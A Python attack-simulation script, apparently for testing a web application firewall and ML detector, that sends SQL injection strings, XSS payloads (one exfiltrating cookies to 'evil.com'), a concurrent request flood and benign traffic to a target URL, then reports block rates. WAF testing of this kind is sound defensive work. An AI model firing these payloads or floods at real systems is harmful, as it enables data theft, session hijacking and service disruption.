#!/usr/bin/env python3
"""
Attack Simulation Script

Simulates various web attacks to test the WAF and ML model.
FOR TESTING PURPOSES ONLY - Run only against your own systems.
"""

import argparse
import json
import time
import random
from typing import List, Dict
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import logging

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT * FROM users --",
    "1; SELECT * FROM information_schema.tables",
    "admin'--",
    "' OR 1=1#",
    "1' ORDER BY 1--",
    "' UNION SELECT username, password FROM users--",
    "'; INSERT INTO users VALUES('hacker', 'password')--",
    "1' AND '1'='1",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "<body onload=alert('XSS')>",
    "<iframe src='javascript:alert(1)'>",
    "<input onfocus=alert('XSS') autofocus>",
    "'\"><script>alert('XSS')</script>",
    "<script>document.location='http://evil.com?c='+document.cookie</script>",
    "<img src=\"javascript:alert('XSS')\">",
]

BENIGN_REQUESTS = [
    {"method": "GET", "path": "/api/users", "body": None},
    {"method": "GET", "path": "/api/products", "body": None},
    {"method": "POST", "path": "/api/search", "body": {"query": "widget"}},
    {"method": "POST", "path": "/api/feedback", "body": {"message": "Great service!"}},
    {"method": "GET", "path": "/health", "body": None},
    {"method": "POST", "path": "/api/login", "body": {"username": "user", "password": "pass123"}},
]


class AttackSimulator:
    """Simulates various web attacks for testing."""

    def __init__(self, base_url: str, timeout: int = 10):
        """
        Initialize the simulator.

        Args:
            base_url: Target URL (e.g., http://localhost:5000)
            timeout: Request timeout in seconds
        """
        self.base_url = base_url.rstrip('/')
        self.timeout = timeout
        self.results: List[Dict] = []

    def send_request(
        self,
        method: str,
        path: str,
        body: Dict = None,
        headers: Dict = None,
        label: str = "benign"
    ) -> Dict:
        """
        Send a single request and record the result.

        Args:
            method: HTTP method
            path: Request path
            body: Request body
            headers: Request headers
            label: Attack type label for logging

        Returns:
            Result dictionary
        """
        url = f"{self.base_url}{path}"
        headers = headers or {"Content-Type": "application/json"}

        start_time = time.time()
        result = {
            "url": url,
            "method": method,
            "label": label,
            "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ"),
        }

        try:
            if method == "GET":
                response = requests.get(url, headers=headers, timeout=self.timeout)
            elif method == "POST":
                response = requests.post(
                    url, json=body, headers=headers, timeout=self.timeout
                )
            else:
                response = requests.request(
                    method, url, json=body, headers=headers, timeout=self.timeout
                )

            result["status_code"] = response.status_code
            result["blocked"] = response.status_code in [400, 403, 429]
            result["response_time"] = time.time() - start_time

            try:
                result["response_body"] = response.json()
            except (json.JSONDecodeError, requests.RequestException):
                result["response_body"] = response.text[:200]

        except requests.Timeout:
            result["status_code"] = 0
            result["blocked"] = False
            result["error"] = "timeout"
            result["response_time"] = self.timeout

        except requests.RequestException as e:
            result["status_code"] = 0
            result["blocked"] = False
            result["error"] = str(e)
            result["response_time"] = time.time() - start_time

        self.results.append(result)
        return result

    def simulate_sql_injection(self, count: int = 10) -> List[Dict]:
        """Simulate SQL injection attacks."""
        logger.info(f"Simulating {count} SQL injection attacks...")
        results = []

        for i in range(count):
            payload = random.choice(SQL_INJECTION_PAYLOADS)

            endpoint = random.choice([
                {"path": "/api/search", "body": {"query": payload}},
                {"path": f"/api/users?id={payload}", "body": None},
            ])

            result = self.send_request(
                method="POST" if endpoint["body"] else "GET",
                path=endpoint["path"],
                body=endpoint["body"],
                label="sql_injection"
            )
            results.append(result)

            if result["blocked"]:
                logger.info(f"  [BLOCKED] SQL injection attempt {i+1}")
            else:
                logger.warning(f"  [PASSED] SQL injection attempt {i+1}")

            time.sleep(0.1)

        return results

    def simulate_xss(self, count: int = 10) -> List[Dict]:
        """Simulate XSS attacks."""
        logger.info(f"Simulating {count} XSS attacks...")
        results = []

        for i in range(count):
            payload = random.choice(XSS_PAYLOADS)

            endpoint = random.choice([
                {"path": "/api/feedback", "body": {"message": payload}},
                {"path": "/api/search", "body": {"query": payload}},
            ])

            result = self.send_request(
                method="POST",
                path=endpoint["path"],
                body=endpoint["body"],
                label="xss"
            )
            results.append(result)

            if result["blocked"]:
                logger.info(f"  [BLOCKED] XSS attempt {i+1}")
            else:
                logger.warning(f"  [PASSED] XSS attempt {i+1}")

            time.sleep(0.1)

        return results

    def simulate_ddos(self, requests_per_second: int = 50, duration: int = 10) -> List[Dict]:
        """
        Simulate DDoS attack with high request rate.

        Args:
            requests_per_second: Target RPS
            duration: Duration in seconds
        """
        logger.info(f"Simulating DDoS: {requests_per_second} RPS for {duration}s...")
        results = []
        total_requests = requests_per_second * duration

        def send_request_wrapper(_):
            return self.send_request(
                method="GET",
                path="/api/products",
                label="ddos"
            )

        with ThreadPoolExecutor(max_workers=min(50, requests_per_second)) as executor:
            futures = [
                executor.submit(send_request_wrapper, i)
                for i in range(total_requests)
            ]

            blocked_count = 0
            for future in as_completed(futures):
                result = future.result()
                results.append(result)
                if result.get("blocked"):
                    blocked_count += 1

        logger.info(f"  DDoS simulation complete: {blocked_count}/{total_requests} blocked")
        return results

    def simulate_benign_traffic(self, count: int = 50) -> List[Dict]:
        """Simulate normal benign traffic."""
        logger.info(f"Simulating {count} benign requests...")
        results = []

        for i in range(count):
            req = random.choice(BENIGN_REQUESTS)
            result = self.send_request(
                method=req["method"],
                path=req["path"],
                body=req["body"],
                label="benign"
            )
            results.append(result)

            if result["blocked"]:
                logger.warning(f"  [FALSE POSITIVE] Benign request blocked: {req['path']}")

            time.sleep(0.05)

        blocked = sum(1 for r in results if r.get("blocked"))
        if blocked > 0:
            logger.warning(f"  {blocked} benign requests were blocked (false positives)")
        else:
            logger.info("  All benign requests passed")

        return results

    def run_full_simulation(self) -> Dict:
        """Run a complete attack simulation."""
        logger.info("=" * 60)
        logger.info("Starting Full Attack Simulation")
        logger.info("=" * 60)

        benign_results = self.simulate_benign_traffic(30)
        sql_results = self.simulate_sql_injection(15)
        xss_results = self.simulate_xss(15)

        summary = self.get_summary()
        self.save_results("simulation_results.json")

        logger.info("=" * 60)
        logger.info("Simulation Complete")
        logger.info("=" * 60)
        self.print_summary()

        return summary

    def get_summary(self) -> Dict:
        """Get summary of simulation results."""
        by_label = {}
        for result in self.results:
            label = result.get("label", "unknown")
            if label not in by_label:
                by_label[label] = {"total": 0, "blocked": 0, "errors": 0}

            by_label[label]["total"] += 1
            if result.get("blocked"):
                by_label[label]["blocked"] += 1
            if result.get("error"):
                by_label[label]["errors"] += 1

        for label, stats in by_label.items():
            stats["block_rate"] = stats["blocked"] / stats["total"] if stats["total"] > 0 else 0

        return {
            "total_requests": len(self.results),
            "by_label": by_label,
            "avg_response_time": sum(r.get("response_time", 0) for r in self.results) / len(self.results) if self.results else 0
        }

    def print_summary(self) -> None:
        """Print formatted summary."""
        summary = self.get_summary()

        print("\n" + "=" * 50)
        print("SIMULATION SUMMARY")
        print("=" * 50)
        print(f"Total Requests: {summary['total_requests']}")
        print(f"Avg Response Time: {summary['avg_response_time']:.3f}s")
        print()

        for label, stats in summary["by_label"].items():
            status = "GOOD" if (label != "benign" and stats["block_rate"] > 0.8) or \
                               (label == "benign" and stats["block_rate"] < 0.1) else "REVIEW"
            print(f"{label.upper()}:")
            print(f"  Total: {stats['total']}, Blocked: {stats['blocked']} ({stats['block_rate']:.1%}) [{status}]")

    def save_results(self, filepath: str) -> None:
        """Save results to JSON file."""
        with open(filepath, 'w') as f:
            json.dump({
                "results": self.results,
                "summary": self.get_summary()
            }, f, indent=2)
        logger.info(f"Results saved to {filepath}")


def main():
    parser = argparse.ArgumentParser(description="Web Attack Simulator")
    parser.add_argument(
        "--url",
        default="http://localhost:5000",
        help="Target URL"
    )
    parser.add_argument(
        "--attack",
        choices=["sql", "xss", "ddos", "benign", "all"],
        default="all",
        help="Type of attack to simulate"
    )
    parser.add_argument(
        "--count",
        type=int,
        default=10,
        help="Number of requests per attack type"
    )

    args = parser.parse_args()

    print("\n" + "=" * 60)
    print("WARNING: Use only against systems you own or have permission to test")
    print("=" * 60 + "\n")

    simulator = AttackSimulator(args.url)

    if args.attack == "sql":
        simulator.simulate_sql_injection(args.count)
    elif args.attack == "xss":
        simulator.simulate_xss(args.count)
    elif args.attack == "ddos":
        simulator.simulate_ddos(requests_per_second=20, duration=5)
    elif args.attack == "benign":
        simulator.simulate_benign_traffic(args.count)
    else:
        simulator.run_full_simulation()

    simulator.print_summary()


if __name__ == "__main__":
    main()
